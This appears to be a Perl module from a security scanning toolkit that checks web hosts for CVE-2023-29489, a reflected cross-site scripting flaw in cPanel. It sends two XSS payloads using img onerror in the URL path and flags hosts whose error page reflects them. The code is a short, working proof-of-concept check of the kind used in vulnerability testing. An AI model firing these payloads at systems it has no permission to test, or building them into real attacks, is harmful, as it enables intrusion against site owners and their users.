package Spellbook::Advisory::CVE_2023_29489 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {    
            if ($target !~ /^http(s)?:\/\//) { 
                $target = "https://$target";
            }
                    
            my $userAgent = Spellbook::Core::UserAgent -> new();

            my @payloads = (
                "cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
                "<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
            );

            foreach my $payload (@payloads) {
                my $request = $userAgent -> get("$target/$payload");

                if ($request -> code() == 400 ) {
                    if ($request -> content() =~ /cPanel/) {
                        push @result, "$target/$payload";
                    }
                }
            }

            return @result;
        }

        if ($help) {
            return "
                \rExploit::CVE_2023_29489
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target\n\n";
        }

        return 0;   
    }
}

1;